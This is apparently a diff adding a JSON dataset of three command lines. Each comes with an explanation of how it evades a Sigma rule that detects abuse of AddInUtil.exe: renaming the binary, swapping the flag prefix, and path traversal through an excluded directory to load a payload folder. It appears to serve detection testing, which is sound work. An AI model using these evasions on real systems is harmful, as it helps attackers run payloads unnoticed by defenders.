@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\AddInUtil.exe C:\\Users\\Public\\NotAddIn.exe && C:\\Users\\Public\\NotAddIn.exe -AddInRoot:C:\\Users\\Public\\Payload\\",
+    "explanation": "This bypasses the rule by renaming the binary. The Sigma rule relies on 'selection_img' (Image ending in \\addinutil.exe) or the 'OriginalFileName' metadata. While OriginalFileName is harder to spoof, many SIEM environments do not consistently log or index OriginalFileName for every process creation event. By running a renamed version of the executable, the 'Image' condition fails to match."
+  },
+  {
+    "output": "AddInUtil.exe /AddInRoot:C:\\Users\\Public\\Payload\\",
+    "explanation": "The rule's 'selection_cli' specifically looks for the hyphen prefix ('-AddInRoot:' or '-PipelineRoot:'). Many Windows utilities, including those built on the .NET framework like AddInUtil, accept forward slashes ('/') as parameter delimiters. Using a slash instead of a hyphen may bypass string-based detection patterns that are not configured to account for CLI flexibility."
+  },
+  {
+    "output": "AddInUtil.exe \"-AddInRoot:C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VSTA\\..\\..\\..\\..\\Users\\Public\\Payload\"",
+    "explanation": "This bypass uses path traversal to satisfy the 'filter_main_addinroot' exclusion. The command line contains the allowed string 'C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VSTA', which triggers the 'not 1 of filter_main_*' condition, causing the rule to ignore the activity. However, the operating system resolves the '..' sequences to point the utility toward a malicious directory outside of the protected path."
+  }
+]
